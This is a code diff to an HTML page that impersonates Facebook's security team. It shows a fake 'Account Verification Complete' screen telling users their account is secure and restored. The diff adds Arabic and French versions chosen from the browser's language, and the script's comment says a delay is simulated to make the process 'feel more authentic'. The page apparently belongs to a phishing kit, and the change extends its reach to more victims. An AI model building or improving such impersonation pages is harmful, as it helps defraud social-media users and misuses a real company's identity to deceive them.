@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook - Account Verification Complete</title>
+    <title data-en="Facebook - Account Verification Complete" data-ar="فيسبوك - اكتمال التحقق من الحساب" data-fr="Facebook - Vérification du compte terminée"></title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         :root {
@@ -93,23 +93,41 @@
         .button:hover {
             background-color: #166fe5;
         }
+        [lang="ar"] {
+            direction: rtl;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
         <img src="https://facebook.com/favicon.ico" alt="Facebook logo" class="logo">
-        <h1>Facebook Security</h1>
+        <h1 data-en="Facebook Security" data-ar="أمان فيسبوك" data-fr="Sécurité Facebook"></h1>
     </div>
     <div class="content">
         <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-        <h2>Account Verification Complete</h2>
-        <p>Thank you for verifying your account. Your Facebook account is now secure and all features have been restored.</p>
-        <p>We've implemented additional security measures to protect your account.</p>
-        <a href="#" id="openFacebookButton" class="button">Open Facebook</a>
+        <h2 data-en="Account Verification Complete" data-ar="اكتمال التحقق من الحساب" data-fr="Vérification du compte terminée"></h2>
+        <p data-en="Thank you for verifying your account. Your Facebook account is now secure and all features have been restored." data-ar="شكرًا لك على التحقق من حسابك. حسابك على فيسبوك آمن الآن وتم استعادة جميع الميزات." data-fr="Merci d'avoir vérifié votre compte. Votre compte Facebook est maintenant sécurisé et toutes les fonctionnalités ont été restaurées."></p>
+        <p data-en="We've implemented additional security measures to protect your account." data-ar="لقد قمنا بتنفيذ إجراءات أمنية إضافية لحماية حسابك." data-fr="Nous avons mis en place des mesures de sécurité supplémentaires pour protéger votre compte."></p>
+        <a href="#" id="openFacebookButton" class="button" data-en="Open Facebook" data-ar="فتح فيسبوك" data-fr="Ouvrir Facebook"></a>
     </div>
 </div>
 <script>
+    // Function to set the language
+    function setLanguage(lang) {
+        document.documentElement.lang = lang;
+        document.title = document.querySelector('title').getAttribute(`data-${lang}`);
+        document.querySelectorAll('[data-en]').forEach(el => {
+            el.textContent = el.getAttribute(`data-${lang}`);
+        });
+    }
+
+    // Detect the browser language
+    const browserLang = navigator.language.split('-')[0];
+    const supportedLangs = ['en', 'ar', 'fr'];
+    const lang = supportedLangs.includes(browserLang) ? browserLang : 'en';
+    setLanguage(lang);
+
     // Simulating a delay to make the verification process feel more authentic
     setTimeout(() => {
         document.querySelector('.success-icon').style.opacity = '1';
